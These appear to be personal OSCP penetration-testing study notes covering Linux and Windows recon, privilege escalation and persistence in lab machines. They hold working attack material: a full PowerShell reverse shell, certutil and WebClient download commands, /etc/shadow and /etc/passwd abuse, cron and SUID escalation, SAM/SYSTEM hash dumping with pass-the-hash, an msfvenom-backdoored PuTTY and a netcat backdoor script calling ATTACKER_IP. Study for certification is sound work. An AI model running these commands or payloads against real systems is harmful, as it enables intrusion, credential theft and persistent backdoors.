# OSCP Notes

The course first focuses on basic linux commands and navigation using command line.
I'll just put some important ones on here and then we'll move onto the pentesting section of this course because that is honestly the only thing I am excited about.

- With `ps` command you can see the current processes
- With `kill` command you can kill a pariticular process.
- With `wget` command you can download a file from a remote web browser
- With `curl` command you can download manipulate http requests and modify them on the go

# Customizing the bash enviornment

_Alias_ is a string we can define which can replace the command name. By doing

```bash
alias lsa="ls -la"
```

We can define lsa as ls -la.

# Netcat

It can be run in two modes => client or server.

## Client Mode

we can connect to a tcp port by using client mode.

```bash
nc -n -v $(ip)
```

- -n tells the netcat to use the dns resolution
- -v tells the netcat to run in verbose mode

## Server Mode

```bash
nc -nvlp $(port)
```

This will open the listner.

```bash
nc -nv $(ip) $(port)
```

It can also be used to transfer files, open reverse shell and much more.

# PowerShell

It maintains an execution policy which describes which powershell scipts can be run and which cannot be.
By default it is restricted.
You can unrestrict is by using the following the command

```ps1
Set-ExecutionPolicy Unrestricted
```

And you can check it by the following command

```ps1
Get-ExecutionPolicy
```

## Transfer file using powershell

- ```ps1
  powershell -c "(new-object System.Net.WebClient).DownloadFile('$(source localtion)', '$(targetlocation)')"
  ```

````
* ```ps1
certutil -urlcache -f "$(source location)" $(filename)
````

# Powershell reverse Shell

```ps1
$client = New-Object System.Net.Sockets.TCPClient('$(ip)',$(port));$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

# Passive Recon

## Some Baic commands

- `whois` tells info about a domain
- `nslookup` does a reverse lookup on a domain
- `hosts` command will tell you about the different types of web servers and their ip addresses.

## Security Headers

[securityheaders.com](SecurityHeaders) website shows if the server admin or the developers of the companies are familiar with the concept of server hardening or not.

# Active Recon

## Dns Enumeration

Dns is just a database responsible for routing ip address to domain names.

- ```bash
  host $(website)
  ```

````
This commmand helps in finding the ip address of a domain and also helps in finding different types of webservers and their ips too.
you can specify the type of web server with the help of -t flag

## DNS Zone Transfers

This is an amazing technique which will basically tranfer the whole zone file of domain onto anyserver if misconfigured by sysadmins.
We can find out the domain servers by
```bash
host -t ns $(domain)
````

But The best tool for gathering info about domain is dnsenum

```bash
dnsenum $(domain)
```

## Portscanning

Use nmap for portscanning.

# linux prives

## readable /etc/shadow file

The /etc/shadow file contains user password hashes and is usually readable only by the root user.
Note that the /etc/shadow file on the VM is world-readable by user

```bash
ls -l /etc/shadow
```

View the contents of the /etc/shadow file:

```bash
cat /etc/shadow
```

Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.

Save the root user's hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Switch to the root user, using the cracked password:

```bash
su root
```

# Web application enumeration

There are two aspects server or the web application code (client)

We should always start with nmap that is sever enumeration with nmap.

## Directory Traversal

In this section we will explore Directory Traversal1 attacks, also known as path traversal attacks. This type of attack can be used to access sensitive files on a web server and typically occurs when a web application is not sanitizing user input.

## File Inclusion

We can use file inclusion vulnerabilities to execute local or remote files, while directory traversal only allows us to read the contents of a file. Since we can include files in the application's running code with file inclusion vulnerabilities, we can also display the file contents of non-executable files.

- Local File inclusion: It lets us execute any file which is stored locally on the target server and most of the cases we can do log poisoning by poisoning the file `/var/apache2/access.log`. We can change the user agent of the file and pass on the code we want to execute.

- Remote File inlucsion : It lets us execute any file on any server which is on the same network. So we can host a simple php webshell (or any language shell depends on the target) and make it execute that file on that server.

## File upload vulnerabilitlies.

## Writable /etc/shadow

The /etc/shadow file contains user password hashes and is usually readable only by the root user.

Note that the /etc/shadow file on the VM is world-writable:
`ls -l /etc/shadow
`
Generate a new password hash with a password of your choice:
`mkpasswd -m sha-512 newpasswordhere
`
Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.
Switch to the root user, using the new password:
`su root
`

## Writable /etc/passwd

The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.

Note that the /etc/passwd file is world-writable:

`ls -l /etc/passwd
`
Generate a new password hash with a password of your choice:

`openssl passwd newpasswordhere
`
Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").

Switch to the root user, using the new password:

`su root`
Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").

Now switch to the newroot user, using the new password:

`su newroot
`

## sudo shell escapes

List the programs which sudo allows your user to run:

`sudo -l
`
Visit [GTFOBins](https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.

Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.

## Cron

View the contents of the system-wide crontab:

`cat /etc/crontab
`
Note that the PATH variable starts with /home/user which is our user's home directory.

Create a file called overwrite.sh in your home directory with the following contents:

```bash
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

Make sure that the file is executable:

```bash
chmod +x /home/user/overwrite.sh
```

Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:

```bash
/tmp/rootbash -p
```

## suid

Find all the SUID/SGID executables on the Debian VM:

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

Note that /usr/sbin/exim-4.84-3 appears in the results. Try to find a known exploit for this version of exim. Exploit-DB, Google, and GitHub are good places to search!

A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM at /home/user/tools/suid/exim/cve-2016-1531.sh.

Run the exploit script to gain a root shell:
/home/user/tools/suid/exim/cve-2016-1531.sh

# Windows privesc

## Situational awareness

Powershell Commands

- `whoami`
- `whoami /groups`
- `Get-LocalUser`
- `systeminfo` : Get all the system info
- `ipconfig` : To get all the interfaces of the network.
- `netsta -ano` : To get all the connections that are running on the system.
- `Get-Process` : To see all the processes.

# Windows persistence

## Abusing unprivelleged users

Making them part of administrators group is the best way because you can then directly RDP them or user WinRM to access that machine.

We can also download the sam and system bakup of files from registry

```powershell
reg save hklm\system system.bak
```

```powershell
reg save hklm\sam sam.bak
```

And pass it to secretdumps.py or samdump2 and get the hashes of the users. Once we have the hashes of the user we can pass it on to evil-winrm.

```bash
evil-winrm -i 10.10.142.152 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
```

## Backdooring the files

If you find any executable laying around the desktop, the chances are high that the user might use it frequently. Suppose we find a shortcut to PuTTY lying around. If we checked the shortcut's properties, we could see that it (usually) points to C:\Program Files\PuTTY\putty.exe. From that point, we could download the executable to our attacker's machine and modify it to run any payload we wanted.

```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

There is an alternative way for establishing persistence by changing the properties of that executable itself.

We can create a powershell script named "backdoor.ps1" something like this

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```

This will create a seperate process of netcat connecting back to the listner whenever exectued.

Then this will be put it into the target of the exectuable we are targeting by doing this.

```
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

Now whenever that executable will be double clicked or executed it will revert back top the listner.

## RID Hijacking

Another method to gain administrative privileges without being an administrator is changing some registry values to make the operating system think you are the Administrator.

Windows assigns each user a Relative ID (RID) and the default Administrator account always has a RID of 500. Regular users get RIDs of 1000 or greater. By tampering with these RIDs in the registry, you can fool Windows into thinking an unprivileged user is actually an Administrator

We can find info about it through following command

```powershell
wmic useraccount get name,sid
```
